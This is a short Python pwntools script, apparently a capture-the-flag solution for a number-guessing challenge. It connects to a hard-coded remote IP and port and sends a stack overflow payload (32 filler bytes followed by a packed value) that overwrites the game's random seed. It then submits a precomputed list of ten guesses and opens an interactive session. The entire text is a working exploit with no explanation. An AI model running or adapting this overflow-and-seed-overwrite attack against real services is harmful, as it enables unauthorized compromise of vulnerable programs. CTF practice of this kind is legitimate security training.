from pwn import *

p=remote('220.249.52.133',30172)
#payload='a'*0x20+"aaaa"
payload='a'*0x20+p64(1)
p.sendlineafter("Your name:",payload)
#num=["5","6","4","6","6","2","3","6","2","2"]
num=["2","5","4","2","6","2","5","1","4","2"]
for i in range(10):
    p.sendlineafter("Please input your guess number:",num[i])
p.interactive()